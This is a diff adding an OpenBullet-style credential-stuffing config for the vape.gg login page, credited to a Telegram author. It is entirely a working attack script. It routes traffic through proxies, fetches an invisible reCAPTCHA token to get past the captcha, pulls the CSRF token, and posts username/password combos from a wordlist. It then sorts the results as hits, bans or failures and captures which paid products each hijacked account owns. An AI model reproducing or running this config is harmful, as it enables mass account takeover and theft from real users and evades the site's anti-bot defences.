@@ -1,0 +1,148 @@
+[SETTINGS]
+{
+  "Name": "vape.gg",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-08-15T14:05:34.9640417+04:30",
+  "AdditionalInfo": "https://t.me/Hogo_Victor",
+  "Author": "@Hogo_Victor",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Author Telegram Id:@Hogo_Victor",
+      "VariableName": "",
+      "Id": 2129325581
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Get REQUEST GET "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LfjzbQUAAAAAPKZqfNcKQ6ZxSZ_9dyV1LMaeex9&co=aHR0cHM6Ly93d3cudmFwZS5nZzo0NDM.&hl=en&v=JF4U2g-hvLrBJ_UxdbKj92gN&size=invisible&cb=xn19yfuxrb81" 
+  
+  HEADER "Host: www.google.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Dnt: 1" 
+  HEADER "Referer: https://www.vape.gg/" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Sec-Fetch-Dest: iframe" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Te: trailers" 
+
+#Token PARSE "<SOURCE>" LR "id=\"recaptcha-token\" value=\"" "\"" -> VAR "Token" 
+
+#Post REQUEST POST "https://www.google.com/recaptcha/api2/reload?k=6LfjzbQUAAAAAPKZqfNcKQ6ZxSZ_9dyV1LMaeex9" 
+  CONTENT "JF4U2g-hvLrBJ_UxdbKj92gN&reason=q&c=<Token>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.google.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Origin: https://www.google.com" 
+  HEADER "Dnt: 1" 
+  HEADER "Referer: https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LfjzbQUAAAAAPKZqfNcKQ6ZxSZ_9dyV1LMaeex9&co=aHR0cHM6Ly93d3cudmFwZS5nZzo0NDM.&hl=en&v=JF4U2g-hvLrBJ_UxdbKj92gN&size=invisible&cb=xn19yfuxrb81" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Te: trailers" 
+
+#reCAPTCHA-Token PARSE "<SOURCE>" LR "rresp\",\"" "\"" -> VAR "reCAPTCHA-Token" 
+
+#Get REQUEST GET "https://www.vape.gg/" 
+  
+  HEADER "Host: www.vape.gg" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Dnt: 1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: none" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Te: trailers" 
+  HEADER "Connection: close" 
+
+#Csrf PARSE "<SOURCE>" LR "name=\"csrf-token\" content=\"" "\"" -> VAR "Csrf" 
+
+#Login REQUEST POST "https://www.vape.gg/login" EncodeContent=TRUE 
+  CONTENT "_token=<Csrf>&login=<USER>&password=<PASS>&g-recaptcha-response=<reCAPTCHA-Token>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.vape.gg" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Origin: https://www.vape.gg" 
+  HEADER "Dnt: 1" 
+  HEADER "Referer: https://www.vape.gg/login" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Te: trailers" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "logout" 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" EqualTo "429" 
+  KEYCHAIN Failure OR 
+    KEY "These credentials do not match our records." 
+
+#Vape_v4 PARSE "<SOURCE>" REGEX "Vape v4<\\/div>\\n    <div class=\"vape_sub\">(.*) <a" "[1]" CreateEmpty=FALSE -> CAP "Vape v4" 
+
+#vape_lite PARSE "<SOURCE>" REGEX "vape lite<\\/div>\\n    <div class=\"vape_sub\">\\n(.*)\\n    <\\/div>" "[1]" CreateEmpty=FALSE -> CAP "vape lite" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" AND 
+    KEY "<Vape v4>" EqualTo "Not purchased" 
+    KEY "<vape lite>" EqualTo "Not purchased" 
+
+#Config_By FUNCTION Constant "@Hogo_Victor" -> CAP "Config By" 
+
